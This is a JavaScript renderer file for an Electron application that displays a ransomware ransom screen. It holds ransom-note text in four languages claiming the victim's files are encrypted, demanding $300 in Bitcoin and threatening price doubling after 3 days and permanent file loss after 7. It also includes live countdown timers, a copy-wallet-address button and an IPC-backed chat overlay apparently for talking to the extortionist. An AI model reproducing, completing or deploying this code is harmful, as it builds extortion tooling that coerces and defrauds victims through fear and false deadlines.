const { ipcRenderer } = require('electron');

const translations = {
    en: {
        payment_raised_on: "Payment will be raised on",
        time_left: "Time Left",
        files_lost_on: "Your files will be lost on",
        about_bitcoin: "About bitcoin",
        how_to_buy: "How to buy bitcoins?",
        contact_us: "Contact Us",
        ooops: "Ooops, your files have been encrypted!",
        what_happened_title: "What Happened to My Computer?",
        what_happened_p1: "Your important files are encrypted.",
        what_happened_p2: "Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.",
        can_i_recover_title: "Can I Recover My Files?",
        can_i_recover_p1: "Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time.",
        can_i_recover_p2: "You can decrypt some of your files for free. Try now by clicking <Decrypt>.",
        can_i_recover_p3: "But if you want to decrypt all your files, you need to pay.",
        can_i_recover_p4: "You only have 3 days to submit the payment. After that the price will be doubled.<br>Also, if you don't pay in 7 days, you won't be able to recover your files forever.<br>We will have free events for users who are so poor that they couldn't pay in 6 months.",
        how_do_i_pay_title: "How Do I Pay?",
        how_do_i_pay_p1: "Payment is accepted in Bitcoin only. For more information, click <About bitcoin>.",
        how_do_i_pay_p2: "Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins>.",
        how_do_i_pay_p3: "And send the correct amount to the address specified in this window.",
        how_do_i_pay_p4: "After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am GMT from Monday to Friday.",
        send_amount: "Send $300 worth of bitcoin to this address:",
        copy: "Copy",
        check_payment: "Check Payment",
        decrypt: "Decrypt",
        pay_to_close: "Pay to close!",
        alert_message: "To regain access to the data on your computer, please send Bitcoin to the following address:",
        copy_success: "Address copied to clipboard!",
        copy_success_title: "Success!"
    },
    tr: {
        payment_raised_on: "Ödeme şu tarihte artacak:",
        time_left: "Kalan Süre",
        files_lost_on: "Dosyalarınız şu tarihte silinecek:",
        about_bitcoin: "Bitcoin hakkında",
        how_to_buy: "Bitcoin nasıl satın alınır?",
        contact_us: "Bize Ulaşın",
        ooops: "Eyvah, dosyalarınız şifrelendi!",
        what_happened_title: "Bilgisayarıma ne oldu?",
        what_happened_p1: "Önemli dosyalarınız şifrelendi.",
        what_happened_p2: "Belgelerinizin, fotoğraflarınızın, videolarınızın, veritabanlarınızın ve diğer dosyalarınızın çoğuna şifrelendikleri için artık erişilemiyor. Belki dosyalarınızı kurtarmanın bir yolunu aramakla meşgulsünüz, ancak vaktinizi boşa harcamayın. Şifre çözme hizmetimiz olmadan hiç kimse dosyalarınızı kurtaramaz.",
        can_i_recover_title: "Dosyalarımı Kurtarabilir miyim?",
        can_i_recover_p1: "Elbette. Tüm dosyalarınızı güvenli ve kolay bir şekilde kurtarabileceğinizi garanti ediyoruz. Ancak yeterli zamanınız yok.",
        can_i_recover_p2: "Bazı dosyalarınızı ücretsiz olarak çözebilirsiniz. Şimdi <Decrypt> düğmesine tıklayarak deneyin.",
        can_i_recover_p3: "Ancak tüm dosyalarınızı çözmek istiyorsanız ödeme yapmanız gerekir.",
        can_i_recover_p4: "Ödemeyi yapmak için sadece 3 gününüz var. Bundan sonra fiyat iki katına çıkacaktır.<br>Ayrıca 7 gün içinde ödeme yapmazsanız dosyalarınızı sonsuza kadar kurtaramayacaksınız.<br>6 ay içinde ödeme yapamayacak kadar fakir olan kullanıcılar için ücretsiz etkinliklerimiz olacak.",
        how_do_i_pay_title: "Nasıl Ödeme Yaparım?",
        how_do_i_pay_p1: "Ödeme yalnızca Bitcoin ile kabul edilir. Daha fazla bilgi için <About bitcoin> düğmesine tıklayın.",
        how_do_i_pay_p2: "Lütfen Bitcoin'in güncel fiyatını kontrol edin ve biraz bitcoin satın alın. Daha fazla bilgi için <How to buy bitcoins> düğmesine tıklayın.",
        how_do_i_pay_p3: "Ve bu pencerede belirtilen adrese doğru tutarı gönderin.",
        how_do_i_pay_p4: "Ödemenizden sonra <Check Payment> düğmesine tıklayın. Kontrol etmek için en iyi zaman: Pazartesi'den Cuma'ya GMT 09:00 - 11:00 arasıdır.",
        send_amount: "Bu adrese 300 dolar değerinde bitcoin gönderin:",
        copy: "Kopyala",
        check_payment: "Ödemeyi Kontrol Et",
        decrypt: "Şifre Çöz",
        pay_to_close: "Kapatmak için öde!",
        alert_message: "Bilgisayarınızdaki verilere yeniden erişim sağlamak için lütfen aşağıdaki adrese Bitcoin gönderin:",
        copy_success: "Adres panoya kopyalandı!",
        copy_success_title: "Başarılı!"
    },
    es: {
        payment_raised_on: "El pago aumentará el",
        time_left: "Tiempo restante",
        files_lost_on: "Sus archivos se perderán el",
        about_bitcoin: "Acerca de bitcoin",
        how_to_buy: "¿Cómo comprar bitcoins?",
        contact_us: "Contáctenos",
        ooops: "¡Uy, sus archivos han sido cifrados!",
        what_happened_title: "¿Qué pasó con mi computadora?",
        what_happened_p1: "Sus archivos importantes están cifrados.",
        what_happened_p2: "Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no son accesibles porque han sido cifrados. Tal vez esté ocupado buscando una manera de recuperar sus archivos, pero no pierda su tiempo. Nadie puede recuperar sus archivos sin nuestro servicio de descifrado.",
        can_i_recover_title: "¿Puedo recuperar mi archivos?",
        can_i_recover_p1: "Claro. Garantizamos que puede recuperar todos sus archivos de forma segura y fácil. Pero no tiene tanto tiempo.",
        can_i_recover_p2: "Puede descifrar algunos de sus archivos de forma gratuita. Pruébelo ahora haciendo clic en <Decrypt>.",
        can_i_recover_p3: "Pero si desea descifrar todos sus archivos, debe pagar.",
        can_i_recover_p4: "Solo tiene 3 días para enviar el pago. Después de eso, el precio se duplicará.<br>Además, si no paga en 7 días, no podrá recuperar sus archivos para siempre.<br>Tendremos eventos gratuitos para usuarios que son tan pobres que no pudieron pagar en 6 meses.",
        how_do_i_pay_title: "¿Cómo pago?",
        how_do_i_pay_p1: "El pago solo se acepta en Bitcoin. Para obtener más información, haga clic en <About bitcoin>.",
        how_do_i_pay_p2: "Verifique el precio actual de Bitcoin y compre algunos bitcoins. Para obtener más información, haga clic en <How to buy bitcoins>.",
        how_do_i_pay_p3: "Y envíe la cantidad correcta a la dirección especificada en esta ventana.",
        how_do_i_pay_p4: "Después de su pago, haga clic en <Check Payment>. El mejor momento para verificar: de 9:00 a.m. a 11:00 a.m. GMT de lunes a viernes.",
        send_amount: "Envíe $300 en bitcoin a esta dirección:",
        copy: "Copiar",
        check_payment: "Verificar Pago",
        decrypt: "Descifrar",
        pay_to_close: "¡Paga para cerrar!",
        alert_message: "Para recuperar el acceso a los datos de su computadora, envíe Bitcoin a la siguiente address:",
        copy_success: "¡Dirección copiada al portapapeles!",
        copy_success_title: "¡Éxito!"
    },
    de: {
        payment_raised_on: "Zahlung wird erhöht am",
        time_left: "Verbleibende Zeit",
        files_lost_on: "Ihre Dateien gehen verloren am",
        about_bitcoin: "Über Bitcoin",
        how_to_buy: "Wie kaufe ich Bitcoins?",
        contact_us: "Kontaktieren Sie uns",
        ooops: "Ups, Ihre Dateien wurden verschlüsselt!",
        what_happened_title: "Was ist mit meinem Computer passiert?",
        what_happened_p1: "Ihre wichtigen Dateien sind verschlüsselt.",
        what_happened_p2: "Viele Ihrer Dokumente, Fotos, Videos, Datenbanken und anderen Dateien sind nicht mehr zugänglich, da sie verschlüsselt wurden. Vielleicht sind Sie damit beschäftigt, nach einer Möglichkeit zu suchen, Ihre Dateien wiederherzustellen, aber verschwenden Sie nicht Ihre Zeit. Niemand kann Ihre Dateien ohne unseren Entschlüsselungsdienst wiederherstellen.",
        can_i_recover_title: "Kann ich meine Dateien wiederherstellen?",
        can_i_recover_p1: "Sicher. Wir garantieren, dass Sie alle Ihre Dateien sicher und einfach wiederherstellen können. Aber Sie haben nicht so viel Zeit.",
        can_i_recover_p2: "Sie können einige Ihrer Dateien kostenlos entschlüsseln. Versuchen Sie es jetzt, indem Sie auf <Decrypt> klicken.",
        can_i_recover_p3: "Aber wenn Sie alle Ihre Dateien entschlüsseln möchten, müssen Sie bezahlen.",
        can_i_recover_p4: "Sie haben nur 3 Tage Zeit, um die Zahlung zu leisten. Danach wird sich der Preis verdoppeln.<br>Wenn Sie nicht innerhalb von 7 Tagen bezahlen, können Sie Ihre Dateien nie wiederherstellen.<br>Wir werden kostenlose Veranstaltungen für Benutzer haben, die so arm sind, dass sie innerhalb von 6 Monaten nicht bezahlen konnten.",
        how_do_i_pay_title: "Wie bezahle ich?",
        how_do_i_pay_p1: "Zahlungen werden nur in Bitcoin akzeptiert. Für weitere Informationen klicken Sie auf <About bitcoin>.",
        how_do_i_pay_p2: "Bitte überprüfen Sie den aktuellen Bitcoin-Preis und kaufen Sie einige Bitcoins. Für weitere Informationen klicken Sie auf <How to buy bitcoins>.",
        how_do_i_pay_p3: "Und senden Sie den richtigen Betrag an die in diesem Fenster angegebene Adresse.",
        how_do_i_pay_p4: "Klicken Sie nach Ihrer Zahlung auf <Check Payment>. Beste Zeit zum Überprüfen: 9:00 - 11:00 Uhr GMT von Montag bis Freitag.",
        send_amount: "Senden Sie Bitcoin im Wert von 300 $ an diese Adresse:",
        copy: "Kopieren",
        check_payment: "Zahlung prüfen",
        decrypt: "Entschlüsseln",
        pay_to_close: "Zahlen zum Schließen!",
        alert_message: "Um wieder Zugriff auf die Daten auf Ihrem Computer zu erhalten, senden Sie bitte Bitcoin an die folgende Adresse:",
        copy_success: "Adresse in die Zwischenablage kopiert!",
        copy_success_title: "Erfolg!"
    }
};

function updateLanguage(lang) {
    const translation = translations[lang];
    if (!translation) return;

    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translation[key]) {
            el.innerHTML = translation[key];
        }
    });
}

document.querySelector('.language-select').addEventListener('change', (e) => {
    updateLanguage(e.target.value);
});

document.querySelector('.copy-btn').addEventListener('click', () => {
    const input = document.querySelector('.address-input-container input');
    input.select();
    document.execCommand('copy');
    document.getElementById('copy-alert-overlay').style.display = 'flex';
});

// Setup target dates
const now = new Date();
const target1 = new Date(now.getTime() + 3 * 24 * 60 * 60 * 1000); // 3 days
const target2 = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 days

const formatDateTime = (date) => {
    const pad = n => n < 10 ? '0' + n : n;
    return `${date.getMonth()+1}/${date.getDate()}/${date.getFullYear()} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
};

document.getElementById('timer1-date').textContent = formatDateTime(target1);
document.getElementById('timer2-date').textContent = formatDateTime(target2);

const totalDuration1 = 3 * 24 * 60 * 60 * 1000;
const totalDuration2 = 7 * 24 * 60 * 60 * 1000;

function updateTimers() {
    const currentTime = new Date();
    const diff1 = Math.max(0, target1 - currentTime);
    const diff2 = Math.max(0, target2 - currentTime);
    
    const formatDiff = (d) => {
        const days = Math.floor(d / (1000 * 60 * 60 * 24));
        const hours = Math.floor((d % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const mins = Math.floor((d % (1000 * 60 * 60)) / (1000 * 60));
        const secs = Math.floor((d % (1000 * 60)) / 1000);
        const pad = n => n < 10 ? '0' + n : n;
        return `${pad(days)}:${pad(hours)}:${pad(mins)}:${pad(secs)}`;
    };

    document.getElementById('countdown1').textContent = formatDiff(diff1);
    document.getElementById('countdown2').textContent = formatDiff(diff2);
    
    // Update progress bars (shrinking from top to bottom)
    const progress1Percentage = (diff1 / totalDuration1) * 100;
    const progress2Percentage = (diff2 / totalDuration2) * 100;
    
    document.getElementById('progress1').style.height = `${progress1Percentage}%`;
    document.getElementById('progress2').style.height = `${progress2Percentage}%`;
}

setInterval(updateTimers, 1000);
updateTimers();

function openCryptoSite(url) {
    ipcRenderer.send('open-custom-window', url);
}

// Chat Overlay Logic
window.openDecryChat = () => {
    document.getElementById('decry-chat-overlay').style.display = 'flex';
};

const chatInput = document.getElementById('decry-chat-input');
const chatSendBtn = document.getElementById('decry-send-btn');
const chatMessages = document.getElementById('decry-chat-messages');

function sendDecryMessage() {
    const msg = chatInput.value.trim();
    if (!msg) return;
    
    // Add to UI
    const msgDiv = document.createElement('div');
    msgDiv.className = 'chat-bubble self';
    msgDiv.innerText = msg;
    chatMessages.appendChild(msgDiv);
    chatMessages.scrollTop = chatMessages.scrollHeight;
    
    // Send to main process
    ipcRenderer.send('send-chat', msg);
    chatInput.value = '';
}

chatSendBtn.addEventListener('click', sendDecryMessage);
chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendDecryMessage();
});

ipcRenderer.on('receive-chat', (event, message) => {
    // Open chat window if not open
    document.getElementById('decry-chat-overlay').style.display = 'flex';
    
    const msgDiv = document.createElement('div');
    msgDiv.className = 'chat-bubble other';
    msgDiv.innerText = message;
    chatMessages.appendChild(msgDiv);
    chatMessages.scrollTop = chatMessages.scrollHeight;
});
